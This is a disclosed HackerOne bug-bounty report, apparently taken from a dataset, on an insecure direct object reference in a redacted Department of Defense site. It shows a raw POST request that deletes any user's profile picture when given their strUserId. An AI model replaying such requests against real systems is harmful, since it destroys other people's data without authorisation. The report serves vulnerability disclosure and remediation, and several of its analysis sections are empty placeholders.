---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '2213900'
original_report_id: '2213900'
title: IDOR to delete profile images in https:███████
weakness: Insecure Direct Object Reference (IDOR)
team_handle: deptofdefense
created_at: '2023-10-18T04:23:02.069Z'
disclosed_at: '2023-12-21T17:42:51.198Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 38
tags:
- hackerone
- insecure-direct-object-reference-idor
---

# IDOR to delete profile images in https:███████

## Metadata

- HackerOne Report ID: 2213900
- Weakness: Insecure Direct Object Reference (IDOR)
- Program: deptofdefense
- Disclosed At: 2023-12-21T17:42:51.198Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi Team!
When I was testing the  https:█████████/userprofile.aspx discovered that pictures added were being deleted with a get request like so:
```
POST /AJAXUtilities.aspx HTTP/1.1
Host: ████████
Content-Length: 73
Sec-Ch-Ua: "Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"
Accept: text/plain, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Origin: https:█████████
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https:████/userprofile.aspx
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,fa;q=0.8
Connection: close

strCall=DeleteProfilePicture&strUserId=72827C83FCED4483B2B1077EA5B0C041

```
strUserId params seemed like a potential IDOR that lead to delete profile picture just with UserId
Poc video attached

## Impact

delete user profiles just using strUserId

## System Host(s)
████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
video attached

## Suggested Mitigation/Remediation Actions

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
